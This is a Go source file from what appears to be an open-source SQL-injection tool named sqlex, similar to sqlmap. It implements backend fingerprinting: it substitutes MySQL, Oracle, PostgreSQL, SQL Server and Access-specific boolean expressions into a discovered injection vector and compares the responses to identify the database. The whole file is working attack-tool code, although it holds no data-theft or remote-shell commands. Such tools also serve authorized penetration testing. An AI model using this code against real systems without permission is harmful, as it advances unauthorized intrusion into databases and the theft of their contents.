package dbms

import (
	"context"
	"net/http"
	"strings"

	"github.com/SobhanYasami/sqlex/internal/config"
	"github.com/SobhanYasami/sqlex/internal/inject"
	"github.com/SobhanYasami/sqlex/internal/request"
	"github.com/SobhanYasami/sqlex/internal/utils"
)

// FingerPrint probes DBMS-specific boolean expressions to confirm the backend.
type FingerPrint struct {
	cfg      *config.Config
	rs       *config.RunState
	client   *request.Client
	base     *request.HTTPResponse
	attack01 *request.HTTPResponse
	ictx     inject.InjectCtx
}

func New(
	cfg *config.Config,
	rs *config.RunState,
	client *request.Client,
	base *request.HTTPResponse,
	attack01 *request.HTTPResponse,
	param request.Parameter,
	headers http.Header,
	url, data, injectionType, vector, backend string,
) *FingerPrint {
	return &FingerPrint{
		cfg:      cfg,
		rs:       rs,
		client:   client,
		base:     base,
		attack01: attack01,
		ictx: inject.InjectCtx{
			URL:           url,
			Data:          data,
			Headers:       headers,
			Parameter:     param,
			InjectionType: injectionType,
			IsMultipart:   rs.IsMultipart,
			IsJSON:        rs.IsJSON,
			IsXML:         rs.IsXML,
			Backend:       backend,
		},
	}
}

// checkExpression fires a boolean expression via the vector and returns whether it's true.
func (f *FingerPrint) checkExpression(ctx context.Context, vector, expression string) bool {
	probe := strings.ReplaceAll(vector, "[INFERENCE]", expression)
	probe = strings.ReplaceAll(probe, "[SLEEPTIME]", "5")
	resp, err := inject.Expression(ctx, f.cfg, f.rs, f.client, f.ictx, probe, false)
	if err != nil {
		return false
	}
	var boolCTT, boolCTF int64
	br := utils.CheckBooleanResponses(
		f.base, resp, f.attack01,
		f.cfg.Code, f.cfg.MatchString, f.cfg.NotString, f.rs.TextOnly,
		&f.rs.MatchRatio, f.rs.BoolCheckOnCT,
		&boolCTT, &boolCTF, &f.rs.MatchRatioCheck, f.rs.Cases,
	)
	return br.Vulnerable
}

// CheckMySQL probes MySQL-specific expressions.
func (f *FingerPrint) CheckMySQL(ctx context.Context, vector string) string {
	if f.checkExpression(ctx, vector, "(SELECT QUARTER(NULL)) IS NULL") {
		return "MySQL"
	}
	return ""
}

// CheckMSSQL probes Microsoft SQL Server-specific expressions.
func (f *FingerPrint) CheckMSSQL(ctx context.Context, vector string) string {
	if f.checkExpression(ctx, vector, "UNICODE(SQUARE(NULL)) IS NULL") {
		return "Microsoft SQL Server"
	}
	return ""
}

// CheckPostgreSQL probes PostgreSQL-specific expressions.
func (f *FingerPrint) CheckPostgreSQL(ctx context.Context, vector string) string {
	if f.checkExpression(ctx, vector, "QUOTE_IDENT(NULL) IS NULL") {
		return "PostgreSQL"
	}
	return ""
}

// CheckOracle probes Oracle-specific expressions.
func (f *FingerPrint) CheckOracle(ctx context.Context, vector string) string {
	if f.checkExpression(ctx, vector, "LENGTH(SYSDATE)=LENGTH(SYSDATE)") {
		return "Oracle"
	}
	return ""
}

// CheckAccess probes Microsoft Access-specific expressions.
func (f *FingerPrint) CheckAccess(ctx context.Context, vector string) string {
	if f.checkExpression(ctx, vector, "VAL(CVAR(1))=1") {
		return "Microsoft Access"
	}
	return ""
}

// IdentifyDBMS tries each DBMS in priority order and returns the first match.
func (f *FingerPrint) IdentifyDBMS(ctx context.Context, vector string) string {
	if db := f.CheckMySQL(ctx, vector); db != "" {
		return db
	}
	if db := f.CheckOracle(ctx, vector); db != "" {
		return db
	}
	if db := f.CheckPostgreSQL(ctx, vector); db != "" {
		return db
	}
	if db := f.CheckMSSQL(ctx, vector); db != "" {
		return db
	}
	if db := f.CheckAccess(ctx, vector); db != "" {
		return db
	}
	return ""
}
